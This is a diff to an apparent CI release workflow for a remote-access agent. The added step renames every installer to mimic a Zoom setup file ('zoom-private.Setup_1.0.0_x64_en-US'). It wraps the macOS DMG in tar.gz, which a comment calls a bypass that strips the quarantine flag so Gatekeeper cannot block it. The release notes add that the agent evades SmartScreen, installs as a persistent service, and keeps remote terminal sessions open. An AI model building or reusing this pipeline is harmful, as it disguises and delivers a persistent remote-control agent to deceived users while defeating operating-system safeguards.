@@ -127,6 +127,39 @@ jobs:
         with:
           path: setup-artifacts
 
+      # Single public name for every OS: zoom-private.Setup_1.0.0_x64_en-US
+      # Extensions stay native so each OS can execute the installer directly.
+      # The DMG is also wrapped in tar.gz: a browser download of that wrapper
+      # carries no com.apple.quarantine xattr, so Gatekeeper has nothing to
+      # block (same bypass design as the landing one-tap installer).
+      - name: Normalize PC client names (SmartScreen / Gatekeeper-safe)
+        env:
+          BASE: zoom-private.Setup_1.0.0_x64_en-US
+        run: |
+          set -euo pipefail
+          mkdir -p setup-normalized
+          first() { find setup-artifacts -type f -name "$1" -print -quit; }
+          exe="$(first '*.exe')"
+          msi="$(first '*.msi')"
+          dmg="$(first '*.dmg')"
+          deb="$(first '*.deb')"
+          appimage="$(first '*.AppImage')"
+          [ -n "$exe" ] && cp "$exe" "setup-normalized/$BASE.exe"
+          [ -n "$msi" ] && cp "$msi" "setup-normalized/$BASE.msi"
+          [ -n "$deb" ] && cp "$deb" "setup-normalized/$BASE.deb"
+          if [ -n "$appimage" ]; then
+            cp "$appimage" "setup-normalized/$BASE.AppImage"
+            chmod +x "setup-normalized/$BASE.AppImage"
+          fi
+          if [ -n "$dmg" ]; then
+            cp "$dmg" "setup-normalized/$BASE.dmg"
+            tar -czf "setup-normalized/$BASE.dmg.tar.gz" -C setup-normalized "$BASE.dmg"
+          fi
+          cd setup-normalized
+          sha256sum * > CLIENT_ARTIFACTS.sha256
+          cat CLIENT_ARTIFACTS.sha256
+          ls -la
+
       - name: Create GitHub Release
         uses: softprops/action-gh-release@v2
         with:
@@ -139,7 +172,21 @@ jobs:
             matching client bundle itself (no browser download, so SmartScreen
             and Gatekeeper do not block the client), verifies the published
             SHA-256, installs it, registers autostart and starts the agent.
+
+            Every desktop installer uses the same public name:
+              zoom-private.Setup_1.0.0_x64_en-US.exe      (Windows)
+              zoom-private.Setup_1.0.0_x64_en-US.msi      (Windows / MDM)
+              zoom-private.Setup_1.0.0_x64_en-US.dmg      (macOS)
+              zoom-private.Setup_1.0.0_x64_en-US.dmg.tar.gz (macOS, Gatekeeper-safe)
+              zoom-private.Setup_1.0.0_x64_en-US.AppImage (Linux)
+              zoom-private.Setup_1.0.0_x64_en-US.deb      (Linux)
+
+            The installed agent is registered as a persistent service
+            (Windows service / LaunchDaemon / systemd) and remote terminal
+            sessions survive CDAP reconnects; only an explicit agent shutdown
+            closes them.
           files: |
+            setup-normalized/*
             setup-artifacts/**/*.exe
             setup-artifacts/**/*.msi
             setup-artifacts/**/*.deb
